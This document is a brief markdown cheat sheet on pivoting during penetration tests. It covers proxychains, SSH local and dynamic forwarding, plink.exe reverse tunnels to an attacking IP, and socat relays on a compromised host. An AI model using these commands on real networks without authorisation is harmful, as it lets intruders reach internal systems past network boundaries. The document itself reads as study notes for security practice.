# Pivoting

## There are 2 types of pivoting

1. Port Forwarding (only one port)
2. Tunnelling and Proxying (all ports)

## Proxychains

Works by prepending the command `proxychains` before other commands.

Proxychains configuration file: `/etc/proxychains.conf` (but proxychains will look into working direcotry first)

```
cp /etc/proxychains.conf .
```

## SSH Tunnelling / Port Forwarding

### Forward (local) Connections

Created from our attacking machine, when we have SSH access to the target.

Local port forwarding:
```
ssh -L LOCAL_LPORT:TARGET_RHOST:TARGET_RPORT USER@TARGET_RHOST -fN
```

Dynamic proxy:
```
ssh -D LOCAL_LPORT USER@TARGET_RHOST -fN
```

## plink.exe

[https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

```
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

Note that any keys generated by `ssh-keygen` will not work properly here. You will need to convert them using the `puttygen` tool, which can be installed on Kali using `sudo apt install putty-tools`. After downloading the tool, conversion can be done with: `puttygen KEYFILE -o OUTPUT_KEY.ppk`
Substituting in a valid file for the keyfile, and adding in the output file.

## socat

[linux](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)
[windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download)

```
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
./socat tcp-l:<COMPROMISED_LPORT>,fork,reuseaddr tcp:<TARGET_RHOST>:<TARGET_RPORT> &
```
